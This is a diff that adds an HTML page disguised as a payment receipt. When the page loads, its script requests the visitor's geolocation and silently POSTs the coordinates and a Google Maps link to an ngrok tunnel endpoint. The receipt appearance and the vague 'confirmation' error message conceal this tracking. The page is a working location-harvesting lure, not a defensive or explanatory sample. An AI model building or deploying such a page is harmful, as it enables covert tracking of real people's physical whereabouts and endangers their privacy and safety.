@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en-EN">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Receipt</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="comprovante-container">
+    <h1>Receipt</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Status:</span> Receipt OK</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>NVM.</p>
+      <p><a href="#">Click here</a> for more info.</p>
+    </div>
+
+  </div>
+
+  <script>
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Something went wrong...try again later.");
+      }
+    });
+
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("https://bffd-212-51-128-217.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            alert("Error sending confirmation.");
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
+    }
+
+    function handleError(error) {
+      alert("Error obtaining location: " + error.message);
+    }
+  </script>
+</body>
+
+</html>
